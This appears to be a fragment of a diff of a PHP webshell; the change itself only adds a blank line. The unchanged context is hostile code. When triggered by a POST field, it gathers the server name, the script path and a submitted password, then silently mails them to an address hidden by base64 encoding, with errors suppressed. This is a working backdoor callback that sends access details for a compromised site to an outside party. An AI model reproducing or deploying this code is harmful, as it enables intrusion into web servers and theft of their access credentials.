@@ -1,4 +1,5 @@
 <?php
+
 //--------------Watching webshell!--------------
 if(array_key_exists('watching',$_POST)){
 	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail(base64_decode("Y3liZXJzZXJrZXJzQGdtYWlsLmNvbQ=="), 'root', $tmp); // Edit or delete!
